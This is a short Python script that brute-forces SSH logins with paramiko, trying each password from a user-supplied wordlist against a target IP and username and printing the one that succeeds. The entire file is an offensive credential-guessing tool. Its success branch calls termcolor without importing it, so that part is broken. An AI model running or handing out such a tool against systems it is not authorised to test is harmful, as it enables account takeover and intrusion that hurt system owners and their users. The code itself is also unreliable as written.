import paramiko, sys, os, socket

def ssh_connect(password, code=0):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    try:
        ssh.connect(host, port=22, username=username, password=password)
    except paramiko.AuthenticationException:
        code = 1
    except socket.error as e:
        code = 2

    ssh.close()
    return code

host = input('[+] Enter the IP of target: ')
username = input('[+] Enter the SSH username: ')
wordlist = input('[+] Path to wordlist: ')
print('\n')

if os.path.exists(wordlist) == False:
    print('[!!] Invalid path or wordlist not found. ')
    sys.exit(1)

with open(wordlist, 'r') as file:
    for line in file.readlines():
        password = line.strip()
        try:
            response = ssh_connect(password)
            if response == 0:
                print(termcolor.colored(('[+] Password is: ' + password + ', for user: ' + username), 'yellow'))
                break
            elif response == 1:
                print('[-] bad login: ' + password)
            elif response == 2:
                print('[!!] Unable to connect to target.')
                sys.exit(1)
        except Exception as e:
            print(e)
            pass
